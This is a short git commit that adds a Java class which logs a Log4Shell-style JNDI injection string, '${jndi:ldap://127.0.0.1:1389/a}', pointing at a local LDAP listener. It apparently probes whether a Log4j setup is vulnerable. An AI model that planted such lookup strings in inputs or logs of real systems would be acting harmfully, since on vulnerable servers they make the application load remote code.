602c4cb4ce0f67f26375b7f3d1004a4423303737
Pan Luo <pan.luo@ubc.ca>
2021-12-10 12:21:37 -0800

    Init commit

---
+++ src/main/java/log4j.java
@@ -0,0 +1,15 @@
+package main.java;
+
+//import org.apache.logging.log4j.LogManager;
+//import org.apache.logging.log4j.Logger;
+import org.apache.log4j.Logger;
+import org.apache.log4j.LogManager;
+
+
+public class log4j {
+    private static final Logger logger = LogManager.getLogger(log4j.class);
+
+    public static void main(String[] args) {
+        logger.error("${jndi:ldap://127.0.0.1:1389/a}");
+    }
+}
